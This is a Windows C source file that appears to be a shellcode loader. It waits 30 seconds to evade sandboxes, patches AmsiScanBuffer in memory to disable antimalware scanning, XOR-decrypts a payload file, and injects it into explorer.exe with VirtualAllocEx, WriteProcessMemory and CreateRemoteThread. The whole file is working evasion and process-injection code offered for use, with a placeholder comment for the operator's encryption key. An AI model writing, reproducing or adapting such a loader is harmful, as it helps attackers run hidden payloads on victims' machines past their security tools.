#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

void checkSystem() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    char hostname[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
}

void bypassAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    FARPROC asb = GetProcAddress(amsi, "AmsiScanBuffer");
    DWORD old;
    VirtualProtect(asb, 6, PAGE_EXECUTE_READWRITE, &old);
    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    memcpy(asb, patch, sizeof(patch));
    VirtualProtect(asb, 6, old, &old);
}

int main() {
    Sleep(30000);
    checkSystem();
    bypassAMSI();

    FILE* f = fopen("encrypted_shell.bin", "rb");
    if (!f) return 1;
    fseek(f, 0, SEEK_END);
    int len = ftell(f);
    rewind(f);
    unsigned char* shellcode = (unsigned char*)malloc(len);
    fread(shellcode, 1, len, f);
    fclose(f);

    unsigned char key = 0xB5; // YOUR KEY HERE - MAKE SURE MATCHES TO encrypt.py's KEY
    for (int i = 0; i < len; i++) {
        shellcode[i] ^= key;
    }

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;
    if (Process32First(snapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, "explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    if (pid == 0) return 1;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return 1;

    LPVOID mem = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;

    WriteProcessMemory(hProc, mem, shellcode, len, NULL);

    DWORD oldProtect;
    VirtualProtectEx(hProc, mem, len, PAGE_EXECUTE_READ, &oldProtect);
    CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

    free(shellcode);
    CloseHandle(hProc);
    return 0;
}